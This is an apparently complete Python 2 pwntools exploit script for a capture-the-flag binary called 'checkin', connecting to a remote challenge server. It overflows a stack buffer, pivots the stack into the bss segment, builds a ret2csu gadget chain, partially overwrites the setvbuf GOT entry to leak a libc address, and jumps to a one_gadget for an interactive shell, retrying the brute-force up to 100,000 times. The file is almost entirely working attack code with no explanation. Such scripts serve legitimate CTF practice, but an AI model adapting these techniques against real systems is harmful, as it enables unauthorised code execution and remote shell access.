from pwn import *

context.log_level = 'debug'
libc = '/lib/x86_64-linux-gnu/libc.so.6'


elf = ELF('./checkin')
#p = remote("node4.buuoj.cn",29509)

# context.log_level = "debug"
context.arch = "amd64"

bss = 0x4040c0
setvbuf_got = 0x404020

def exp():
	payload = "a"*0xa0 + p64(bss+0xa0) + p64(0x4011BF)  #buf = 0x4040c0
	# attach(p)
	p.send(payload)

	payload = p64(bss+0x200)# last rbp
	payload += p64(0x40124A)# pop 6
	payload += p64(0) + p64(1) # rbx, rbp
	payload += p64(0x404040) #puts arg1 stdout
	payload += p64(0) + p64(0)# r13 r14
	payload += p64(setvbuf_got) #r15
	payload += p64(0x401230)
	payload += p64(0) + p64(0) + p64(bss+0x200) + p64(0) + p64(0) +p64(0) + p64(0) + p64(0x4011BF)
	payload = payload.ljust(0xa0,'\x00') + p64(setvbuf_got+0xa0) + p64(0x4011BF)

	#wait IO
	p.send(payload)
	sleep(0.3)

	p.send('\x50\xc4')
	sleep(0.3)

	libc_base = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00")) -0x1ed6a0
	success("libc_base:"+hex(libc_base))

	p.send("a"*0xa0 +p64(libc_base+0xe3b2e)+p64(libc_base+0xe3b2e))

	p.interactive()

i = 0
while(i<100000):
	try:
		p = remote("node4.buuoj.cn",28628)
		exp()
		break
	except:
		print i
		i+=1
		p.close()
		continue